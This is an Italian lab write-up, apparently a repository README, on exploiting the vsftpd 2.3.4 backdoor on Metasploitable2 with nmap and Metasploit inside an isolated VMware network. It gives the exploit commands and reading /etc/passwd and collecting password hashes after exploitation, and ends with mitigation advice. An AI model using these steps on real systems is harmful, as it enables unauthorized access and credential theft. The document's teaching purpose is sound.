# Cybersecurity Metasploitable2 Lab

> Laboratorio pratico di penetration testing: sfruttamento della vulnerabilità VSFTPD 2.3.4 su Metasploitable2

---

## Sommario

- [Panoramica](#-panoramica)
- [Architettura](#-architettura)
- [Fasi dell'Attacco](#-fasi-dellattacco)
- [Raccomandazioni](#-raccomandazioni-e-mitigazioni)
- [Strumenti](#-strumenti-utilizzati)
- [Risorse](#-risorse-utili)

---

## 🎯 Panoramica

Questo repository documenta un laboratorio pratico di **penetration testing** che simula uno scenario realistico di compromissione di sistema. Il progetto dimostra le principali fasi di un attacco: ricognizione, scansione, sfruttamento e post-sfruttamento.

**Obiettivo principale:** Sfruttare la vulnerabilità backdoor presente in **VSFTPD 2.3.4** su una macchina **Metasploitable2** utilizzando **Kali Linux** come piattaforma di attacco.

### Contesto didattico
Questo progetto è inteso esclusivamente per scopi educativi e di formazione in ambienti controllati e autorizzati.

---

## 🏗️ Architettura

### Configurazione del Laboratorio

Il laboratorio è stato configurato con **VMware** utilizzando una rete **"Host-only"** per garantire isolamento completo dall'ambiente di produzione.

| Componente | Dettagli |
|-----------|----------|
| **Macchina Attaccante** | Kali Linux - `172.16.236.130` |
| **Macchina Target** | Metasploitable2 - `172.16.236.131` |
| **Tipo di Rete** | VMware Host-only Adapter |
| **Isolamento** | Completo dalla rete domestica/aziendale |

### Schema di Rete

```
┌─────────────────┐                    ┌──────────────────┐
│  Kali Linux     │◄─── Host-only ───►│ Metasploitable2  │
│  172.16.236.130 │     Adapter       │  172.16.236.131  │
└─────────────────┘                    └──────────────────┘
        ▲                                       ▲
        └───────────────┬───────────────────┘
                   Rete Isolata (VMware)
```

---

## 🔍 Fasi dell'Attacco

### 3.1 Ricognizione (Reconnaissance)

**Obiettivo:** Identificare la presenza del target sulla rete

**Strumento utilizzato:** `ping`

```bash
ping 172.16.236.131
```

**Output atteso:**
```
PING 172.16.236.131 (172.16.236.131) 56(84) bytes of data.
64 bytes from 172.16.236.131: icmp_seq=1 ttl=64 time=0.500 ms
64 bytes from 172.16.236.131: icmp_seq=2 ttl=64 time=0.350 ms
```

**Interpretazione:** La ricezione di risposte ICMP confirma che il target è raggiungibile sulla rete.

---

### 3.2 Scansione delle Vulnerabilità (Vulnerability Scanning)

**Obiettivo:** Identificare servizi in esecuzione e versioni

**Strumento utilizzato:** `nmap`

```bash
nmap -sV -p- 172.16.236.131
```

**Parametri del comando:**
- `-sV` — Determina la versione dei servizi sulle porte aperte
- `-p-` — Scansiona tutte le 65.535 porte TCP

**Output significativo:**

```
PORT      STATE  SERVICE     VERSION
21/tcp    open   ftp         vsftpd 2.3.4
22/tcp    open   ssh         OpenSSH 4.7p1
25/tcp    open   smtp        Postfix smtpd
...
```

**Vulnerabilità identificata:** La versione `vsftpd 2.3.4` è nota per contenere una backdoor critica introdotta nel 2011.

---

### 3.3 Sfruttamento (Exploitation)

**Obiettivo:** Ottenere accesso al sistema target

**Vulnerabilità sfruttata:** VSFTPD 2.3.4 Backdoor (CVE correlati: esecuzione comando remoto)

**Framework utilizzato:** Metasploit (`msfconsole`)

#### Procedura Dettagliata

**1. Avvio di Metasploit**
```bash
msfconsole
```

**2. Ricerca dell'exploit**
```
search vsftpd
```

**Risultato atteso:**
```
Matching Modules
================
   #  Name                                   Disclosure Date  Rank       Check
   0  exploit/unix/ftp/vsftpd_234_backdoor   2011-07-03       excellent  Yes
   
Description: VSFTPD v2.3.4 Backdoor Command Execution
```

**3. Selezione dell'exploit**
```
use exploit/unix/ftp/vsftpd_234_backdoor
```

**4. Configurazione del target**
```
set RHOSTS 172.16.236.131
```

**5. Verifica delle opzioni**
```
show options
```

**Output atteso:**
```
Module options (exploit/unix/ftp/vsftpd_234_backdoor):

   Name     Current Setting  Required  Description
   ----     ---------------  --------  -----------
   RHOSTS   172.16.236.131   yes       The target host(s)
   LHOST    172.16.236.130   yes       The listen address
   LPORT    4444             yes       The listen port
```

**6. Esecuzione dell'exploit**
```
run
```

**Risultato atteso:**
```
[*] 172.16.236.131:21 - Banner: 220 (vsFTPd 2.3.4)
[*] 172.16.236.131:21 - USER: 331 Please specify the password.
[+] 172.16.236.131:21 - Backdoor command executed successfully
[+] Exploit completed, but no session was created.
```

---

### 3.4 Post-Sfruttamento (Post-Exploitation)

**Obiettivo:** Mantenere l'accesso, raccogliere informazioni, escalare privilegi

#### Comandi Eseguiti sul Target

```bash
# Visualizza la directory corrente
pwd

# Lista i file e le directory
ls -l

# Visualizza informazioni sugli utenti del sistema
cat /etc/passwd

# Verifica i privilegi attuali
whoami

# Naviga il filesystem
cd /home
ls -la
```

**Informazioni raccolte:**
- Verificare se l'accesso è stato ottenuto come `root` o utente standard
- Identificare file sensibili e configurazioni
- Raccogliere hash delle password per il cracking offline
- Enumerare account utente e servizi

---

## ⚠️ Raccomandazioni e Mitigazioni

### Misure di Sicurezza Preventive

**Aggiornamenti Software**
- Applicare patch di sicurezza regolarmente per tutti i servizi
- Mantenere il sistema operativo costantemente aggiornato
- Configurare gli aggiornamenti automatici quando possibile

**Principio del Minimo Privilegio**
- Eseguire i servizi con il minore insieme di privilegi necessari
- Evitare di eseguire servizi come root
- Utilizzare account dedicati per ogni servizio

**Configurazione Firewall**
- Implementare regole firewall restrittive
- Limitare l'accesso ai servizi solo dalle fonti autorizzate
- Disabilitare servizi non necessari

**Monitoraggio e Logging**
- Implementare sistemi di monitoraggio IDS/IPS
- Registrare tutti gli accessi FTP e SSH
- Monitorare attività sospette in tempo reale
- Configurare allarmi per tentativi di accesso non autorizzati

**Hardening del Sistema**
- Disabilitare servizi inutilizzati (FTP, Telnet, ecc.)
- Utilizzare servizi sicuri (SFTP al posto di FTP, SSH al posto di Telnet)
- Implementare autenticazione a due fattori
- Restringere le connessioni SSH per IP/rete

---

## 🛠️ Strumenti Utilizzati

| Strumento | Versione | Funzione |
|-----------|----------|----------|
| **VMware** | - | Gestione macchine virtuali e networking |
| **Kali Linux** | Rolling | Distribuzione con strumenti penetration testing |
| **Metasploitable2** | 3.0.0 | Macchina virtuale deliberatamente vulnerabile |
| **Nmap** | 7.x+ | Scansione di rete e scoperta servizi |
| **Metasploit Framework** | 6.x+ | Sviluppo ed esecuzione exploit |

---

## 📚 Risorse Utili

### Documentazione Ufficiale
- [Kali Linux Official](https://www.kali.org/) — Distribuzione penetration testing
- [Metasploit Framework](https://www.metasploit.com/) — Piattaforma exploit
- [Nmap Project](https://nmap.org/) — Strumento network scanning
- [Metasploitable2 Documentation](https://docs.rapid7.com/metasploit/metasploitable2/) — Target vulnerabile

### Approfondimenti sulla Vulnerabilità
- VSFTPD 2.3.4 Backdoor Analysis
- CVE Database per correlati CVE numbers
- Analisi del codice backdoor

### Guida Markdown
- [Markdown Guide](https://www.markdownguide.org/basic-syntax/) — Sintassi base Markdown
- [GitHub Flavored Markdown](https://github.github.com/gfm/) — Estensioni GitHub

---

## 📋 Note Importanti

- ⚠️ **Uso Etico:** Questo laboratorio deve essere utilizzato esclusivamente per scopi educativi e di formazione in ambienti autorizzati
- 🔒 **Ambiente Isolato:** L'uso di una rete Host-only garantisce l'isolamento totale
- 🎓 **Scopo Didattico:** Metasploitable2 è intenzionalmente vulnerabile per fini educativi
- 📖 **Legittimità:** Assicurarsi di avere autorizzazione esplicita prima di testare qualsiasi sistema

---

**Repository creato per scopi di documentazione e formazione in cybersecurity**

Ultimo aggiornamento: 2025-01-26
